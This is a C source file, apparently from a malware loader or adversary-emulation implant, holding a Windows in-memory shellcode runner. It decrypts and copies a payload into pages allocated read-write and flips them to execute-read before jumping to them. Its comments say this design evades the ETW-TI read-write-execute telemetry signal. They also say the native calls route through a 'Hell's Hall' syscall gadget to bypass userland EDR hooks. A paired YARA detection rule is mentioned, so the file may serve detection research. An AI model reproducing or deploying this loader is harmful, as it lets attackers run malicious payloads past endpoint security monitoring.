/*
 * Memory execution -- Windows (S34 W^X).
 *
 * Allocates the payload buffer via NtAllocateVirtualMemory with
 * PAGE_READWRITE, copies the decrypted payload, then transitions the
 * pages to PAGE_EXECUTE_READ via NtProtectVirtualMemory before jumping.
 * The buffer is never simultaneously writable and executable -- the
 * PAGE_EXECUTE_READWRITE RWX-private-allocation signal that ETW-TI's
 * `EtwTiLogAllocExecVm` keys on does not fire.
 *
 * Both Nt* calls execute via the Hell's Hall gadget inside ntdll (see
 * syscalls.c): no execution of the ntdll Nt* stub prologue, no IAT,
 * no userland hook surface for these two operations.
 *
 * Detection artifact: W^X transition pattern (alloc RW -> protect RX ->
 * execute). Paired YARA: detection/yara/stage1_hellshall_ssn_resolve.yar.
 */

#ifdef _WIN32

#include "mem_exec.h"
#include "api_table.h"

#include <windows.h>

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) (((LONG)(s)) >= 0)
#endif

/* NtCurrentProcess pseudo-handle -- (HANDLE)-1 for all Nt* calls. */
#define NT_CURRENT_PROCESS ((HANDLE)(LONG_PTR)-1)

static void mem_copy(void *dst, const void *src, size_t n) {
    unsigned char *d = (unsigned char *)dst;
    const unsigned char *s = (const unsigned char *)src;
    for (size_t i = 0; i < n; i++) d[i] = s[i];
}

int mem_run(const uint8_t *code, size_t len)
{
    if (!code || len == 0 ||
        !g_api.NtAllocateVirtualMemory ||
        !g_api.NtProtectVirtualMemory  ||
        !g_api.VirtualFree) {
        return -1;
    }

    PVOID   base = NULL;
    SIZE_T  region = (SIZE_T)len;

    /* Alloc RW -- no execute bit. */
    NTSTATUS st = g_api.NtAllocateVirtualMemory(
        NT_CURRENT_PROCESS, &base, 0, &region,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(st) || !base) {
        return -1;
    }

    mem_copy(base, code, len);

    /* Flip to RX before execute. `region` is the granularity-aligned size
     * returned by NtAllocate; reuse it so protect covers the whole mapping. */
    ULONG old_prot = 0;
    PVOID prot_base = base;
    SIZE_T prot_size = region;
    st = g_api.NtProtectVirtualMemory(
        NT_CURRENT_PROCESS, &prot_base, &prot_size,
        PAGE_EXECUTE_READ, &old_prot);
    if (!NT_SUCCESS(st)) {
        g_api.VirtualFree(base, 0, MEM_RELEASE);
        return -1;
    }

    void (*entry)(void) = (void (*)(void))base;
    entry();

    g_api.VirtualFree(base, 0, MEM_RELEASE);
    return 0;
}

#endif /* _WIN32 */
